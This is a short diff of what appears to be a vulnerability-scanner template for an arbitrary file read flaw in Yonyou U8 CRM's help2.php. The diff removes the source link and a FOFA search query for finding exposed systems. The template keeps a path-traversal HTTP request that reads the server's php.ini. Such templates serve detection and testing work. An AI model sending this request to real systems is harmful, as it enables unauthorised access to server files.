@@ -3,12 +3,8 @@ info:
   name: 用友U8 CRM系统 help2 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vo62zlvldvznz304'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vo62zlvldvznz304
-    fofa: title="用友U8CRM"
 http:
 - raw:
   - 'GET /pub/help2.php?key=/../../apache/php.ini HTTP/1.1
